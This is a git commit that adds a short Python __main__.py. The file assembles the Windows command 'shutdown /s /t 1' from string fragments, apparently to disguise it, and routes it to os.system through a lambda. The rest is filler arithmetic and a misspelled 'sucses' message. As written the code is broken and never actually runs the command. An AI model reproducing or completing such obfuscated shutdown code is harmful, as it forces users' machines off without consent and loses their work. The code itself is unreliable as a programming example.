beb7df25bd38559a1984c44a9cdcde93c908e327
Bennett-dev <65304132+Bennett-dev@users.noreply.github.com>
2022-02-11 15:06:49 -0600

    Add files via upload

---
+++ __main__.py
@@ -0,0 +1,26 @@
+import os
+
+class brrrrrrrrrrr:
+
+    def __init__(self):
+        import os
+        x = 1+1
+        x = x+1
+        x = x+1
+        x = x+1
+        x = x+1
+        x = x+1
+        x = x+1
+        global xyz
+        xyz="sh"+"ut "+"do"+"wn /s /t 1"
+        return x
+    def run(self):
+        global x
+        x = lambda y: os.system(xyz)
+p1 = brrrrrrrrrrr
+p1.run
+
+print("sucses")
+
+        
+        
